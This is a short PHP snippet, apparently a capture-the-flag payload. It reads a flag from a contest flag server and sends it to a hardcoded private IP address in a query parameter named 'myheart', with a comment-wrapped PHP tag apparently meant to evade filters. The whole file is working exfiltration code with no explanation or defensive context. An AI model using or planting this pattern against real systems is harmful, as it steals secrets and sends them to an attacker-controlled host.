/*<?php*/
$server_host = "192.168.187.128";
$server_port = 80;
$flag = file_get_contents("http://flagserver.xidian.edu.cn/");
file_get_contents("http://${server_host}:${server_port}/?myheart=${flag}");

